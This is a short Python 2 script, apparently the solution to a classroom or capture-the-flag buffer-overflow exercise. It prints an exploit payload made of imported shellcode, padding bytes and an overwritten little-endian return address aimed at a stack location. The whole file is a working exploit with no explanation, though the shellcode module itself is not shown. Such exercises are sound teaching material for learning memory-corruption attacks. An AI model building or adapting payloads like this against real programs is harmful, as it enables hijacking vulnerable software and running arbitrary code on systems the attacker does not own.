#!/usr/bin/python

from shellcode import shellcode
from struct import pack


if __name__ == '__main__':
    print shellcode + "\x41"*55 + "\x42"*34 + pack("<I", 0xBFFEF57C)
